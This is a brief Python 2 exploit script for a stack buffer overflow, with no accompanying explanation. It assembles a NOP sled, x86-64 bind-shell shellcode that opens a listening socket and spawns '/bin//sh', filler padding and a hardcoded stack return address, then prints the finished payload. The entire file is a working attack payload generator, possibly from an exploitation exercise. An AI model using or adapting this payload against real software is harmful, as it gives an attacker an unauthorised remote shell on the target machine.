from struct import pack

buffer_length_to_return = 440

nop_sled = "\x90"*369

#NOTE: this is in regular hex format, i.e. 0xffffdeadbeef
sled_addr = 0x7fffffffdefc

buf =  b""
buf += b"\x6a\x29\x58\x99\x6a\x01\x5e\x6a\x02\x5f\x0f\x05\x97"
buf += b"\xb0\x32\x0f\x05\x96\xb0\x2b\x0f\x05\x97\x96\xff\xce"
buf += b"\x6a\x21\x58\x0f\x05\x75\xf7\x52\x48\xbf\x2f\x2f\x62"
buf += b"\x69\x6e\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x0f\x05"
                         
padding = "A"*(buffer_length_to_return - len(nop_sled) - len(buf))

payload = nop_sled + buf + padding + pack("<Q", sled_addr)

print payload